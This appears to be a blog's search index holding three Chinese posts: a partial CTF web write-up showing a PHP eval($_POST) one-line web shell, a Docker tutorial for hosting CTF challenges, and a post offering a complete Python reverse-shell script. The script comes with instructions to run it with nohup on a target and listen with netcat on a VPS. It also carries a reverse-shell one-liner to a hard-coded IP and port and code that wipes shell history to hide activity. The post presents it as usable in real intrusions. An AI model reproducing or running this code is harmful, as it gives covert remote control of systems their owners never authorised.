<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Syc Geek 10th web部分题解</title>
    <url>/2019/10/26/Syc%20Geek%2010th%20web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>1.打比赛先撸一只猫</p><p>查看源码，发现简单考点</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$cat=$_GET[<span class="string">'cat'</span>];</span><br><span class="line"><span class="keyword">echo</span> $cat;</span><br><span class="line"><span class="keyword">if</span>($cat==<span class="string">'dog'</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><a id="more"></a>



<p>只需GET传参cat=dog即可</p>
<p>![1572099090928](F:\blog\Li1M.github.io\source_posts\Syc Geek 10th web部分题解\1572099090928.png)</p>
<p>2.你看见过我的菜刀么</p>
<p>打开一看页面有一句话，是事先写好的，通过构造参数可以执行任意命令，往往配合菜刀，蚁剑等工具一起使用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>($_POST[<span class="string">"Syc"</span>]);</span><br></pre></td></tr></table></figure>

<p>![1572100049777](F:\blog\Li1M.github.io\source_posts\Syc Geek 10th web部分题解\1572100049777.png)</p>
<p>这里简单读取一下flag文件，也可以使用菜刀，蚁剑连接。</p>
<p>3.BurpSuiiiiiit!!! </p>
<p>下载文件，解压一下是个jar文件，是burpsuite的扩展包，用burpsuite导入一下就能得到flag</p>
<p>4.性感潇文清，在线算卦 </p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>docker简单学习及简单部署CTF题</title>
    <url>/2019/10/26/docker%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>1.什么是docker: Docker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的Linux或Windows机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。 </p><a id="more"></a>
<p>2.为什么使用docker: docker有以下优点，更高效的利用系统资源，更快速的启动时间，一致的运行环境，持续交付和部署，更轻松的迁移，更轻松的维护和扩展，对比传统虚拟机总结</p>
<table>
<thead>
<tr>
<th>特性</th>
<th>容器</th>
<th>虚拟机</th>
</tr>
</thead>
<tbody><tr>
<td>启动</td>
<td>秒级</td>
<td>分钟级</td>
</tr>
<tr>
<td>硬盘使用</td>
<td>一般为 <code>MB</code></td>
<td>一般为 <code>GB</code></td>
</tr>
<tr>
<td>性能</td>
<td>接近原生</td>
<td>弱于</td>
</tr>
<tr>
<td>系统支持量</td>
<td>单机支持上千个容器</td>
<td>一般几十个</td>
</tr>
</tbody></table>
<p>话不多说，开始使用docker，下面都以root用户运行</p>
<p>1.安装docker</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update	//更新系统软件</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install </span><br><span class="line">apt-get install apt-transport-https</span><br><span class="line">apt-get install ca-certificates</span><br><span class="line">apt-get install curl</span><br><span class="line">apt-get installsoft ware-properties-common	//安装依赖包</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -	//添加官方密钥</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">add-apt-repository <span class="string">"deb [arch=amd64] https://download.docker.com/linux/ubuntu <span class="variable">$(lsb_release -cs)</span> stable"</span>	//添加仓库</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update	//再次更新软件</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install docker-ce	//安装docker，默认安装最新版</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker -v	//查看docker版本 出现Docker version 19.03.4, build 9013bf583a类似文字，则安装成功</span><br></pre></td></tr></table></figure>

<p>2.使用docker镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br></pre></td></tr></table></figure>

<p>添加以下代码，之后保存</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"registry-mirrors"</span>: [</span><br><span class="line">    <span class="string">"https://registry.docker-cn.com"</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker	//重启docker服务</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull ubuntu:16.04	//拉取ubuntu:16.04镜像</span><br><span class="line">docker images	//查看本地已有镜像</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it -d --name ctf -p 8087:80 ubuntu:16.04	//使用ubuntu:16.04镜像，在后台以名字为ctf，映射端口为8087--&gt;80运行一个容器</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps	//查看正在运行的docker容器</span><br><span class="line">docker ps -a	//查看所有的docker容器</span><br></pre></td></tr></table></figure>

<p>3.用容器部署CTF题</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it id /bin/bash	//进入docker容器shell，id一般取前三位即可</span><br></pre></td></tr></table></figure>

<p>进入容器后，搭建一个php7+nginx的简单服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update	//首先更新容器软件源，之后可以进行换源，换源后要再次更新软件源</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install nginx	//安装nginx</span><br><span class="line">apt-get install php7.2-fpm	//安装fpm扩展</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/nginx/sites-available</span><br><span class="line">vim default</span><br></pre></td></tr></table></figure>

<p>将里面内容作出以下修改，不清楚可以自行查询，这里不多讲</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">               include snippets/fastcgi-php.conf;</span><br><span class="line">       <span class="comment">#</span></span><br><span class="line">       <span class="comment">#       # With php7.0-cgi alone:</span></span><br><span class="line">       <span class="comment">#       fastcgi_pass 127.0.0.1:9000;</span></span><br><span class="line">       <span class="comment">#       # With php7.0-fpm:</span></span><br><span class="line">               fastcgi_pass unix:/run/php/php7.2-fpm.sock;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html	//默认网站根目录</span><br><span class="line">touch test.php</span><br><span class="line">vim test.php	//写入&lt;?php phpinfo();?&gt;，若出现phpinfo界面则成功了，可以自己搭建CTF题</span><br></pre></td></tr></table></figure>

<p>3.打包docker镜像给他人使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker commit id ctf:ctf	//将容器固化为镜像</span><br><span class="line">docker <span class="built_in">export</span> id &gt; ctf.tar	//将其打包成docker压缩包供复制到其他电脑上去使用</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker load &lt; ctf.tar	//导入文件为docker镜像，若导入时出现这个问题open /var/lib/docker/tmp/docker-import-970689518/bin/json: no such file or directory，说明这个tar包缺少docker所需要的一些json文件，不能直接导入</span><br><span class="line">cat ctf.tar | docker import - ctf	//可以这样导入</span><br><span class="line">docker images	//查看是否已导入</span><br></pre></td></tr></table></figure>

<p>以上就是docker简单的学习。</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>linux反弹shell脚本的分析</title>
    <url>/2019/10/21/linux%E5%8F%8D%E5%BC%B9shell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>linux的反弹shell脚本，实战，awd都可使用，代码来自原Google安全团队，在目标机运行下面python代码，nohup python shell.py (your ip) (your port) &amp; 在vps进行监听，nc -lvp 5555</p><a id="more"></a>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.0.4',7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> sys,os,socket,pty</span><br><span class="line">shell = <span class="string">"/bin/bash"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'python reverse connector'</span>)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'usage: %s &lt;ip_addr&gt; &lt;port&gt;'</span> % name)         <span class="comment">#使用 输入ip地址 端口</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) !=<span class="number">3</span>:</span><br><span class="line">        usage(sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit()                                      <span class="comment">#如果shell输入不是ip 端口 输出当前路径&lt;ip_addr&gt; &lt;port&gt; 正常退出</span></span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  <span class="comment">#创建TCP Socket</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s.connect((sys.argv[<span class="number">1</span>],int(sys.argv[<span class="number">2</span>])))       <span class="comment"># 连接到指定ip地址，端口处的套接字</span></span><br><span class="line">        <span class="keyword">print</span> (<span class="string">'connect ok'</span>)                            <span class="comment">#不报错输出connect ok</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">'connect failed'</span>)                        <span class="comment">#出错输出connect failed</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    os.dup2(s.fileno(),<span class="number">0</span>)                               <span class="comment">#os库的dup2方法将标准输入、标准输出、标准错误输出重定向到远程</span></span><br><span class="line">    os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">    os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">global</span> shell</span><br><span class="line">    os.unsetenv(<span class="string">"HISTFILE"</span>)                             <span class="comment">#环境变量的设置语法高亮</span></span><br><span class="line">    os.unsetenv(<span class="string">"HISTFILESIZE"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTSIZE"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTORY"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTSAVE"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTZONE"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTLOG"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTCMD"</span>)</span><br><span class="line">    os.putenv(<span class="string">"HISTFILE"</span>,<span class="string">'/dev/null'</span>)</span><br><span class="line">    os.putenv(<span class="string">"HISTSIZE"</span>,<span class="string">'0'</span>)</span><br><span class="line">    os.putenv(<span class="string">"HISTFILESIZE"</span>,<span class="string">'0'</span>)</span><br><span class="line">    pty.spawn(shell)</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
</search>
